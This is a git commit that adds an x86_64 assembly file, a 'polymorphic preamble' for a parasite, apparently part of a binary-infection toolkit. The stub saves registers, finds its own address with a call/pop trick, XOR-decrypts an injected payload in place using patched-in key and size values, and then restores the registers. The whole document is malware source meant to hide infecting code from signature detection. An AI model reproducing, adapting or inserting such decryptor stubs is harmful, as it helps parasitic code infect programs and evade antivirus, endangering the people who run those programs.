78a39fcfb810b65bc498b7b708906bf4ff1fb078
Nick Stephens <nick.stephens93@gmail.com>
2014-03-28 20:14:26 -0700

    Add source of polymorphic preamble for x86_64

---
+++ polypreamble64.asm
@@ -0,0 +1,41 @@
+BITS 64 
+
+; x86_64 polymorphic preamble
+; very primitive polymorphism, simply decrypts
+; the parasite with a one-byte xor key
+
+push rdi ; perserve registers
+push rsi
+push rdx
+push rcx
+push r8
+push r9
+
+jmp short begin
+dummy:
+    jmp ret
+
+begin:
+    xor rax, rax
+    xor rdi, rdi
+    xor rsi, rsi
+    mov rax, 0x00000000; key
+
+call dummy
+ret:
+    pop rbx   ; 64bit difference here
+mov rsi, 0x00000000; size
+add rbx, 28; offset to code (not a parameter)
+
+decrypt:
+    xor [rbx+rdi], rax ; 64bit difference again
+    inc rdi 
+    cmp rdi, rsi
+    jl decrypt
+
+pop r9  ; restore argument registers
+pop r8
+pop rcx
+pop rdx
+pop rsi
+pop rdi
